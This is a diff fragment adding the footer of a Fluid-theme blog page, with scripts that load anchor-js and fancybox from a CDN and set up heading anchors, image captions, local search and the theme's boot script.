+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
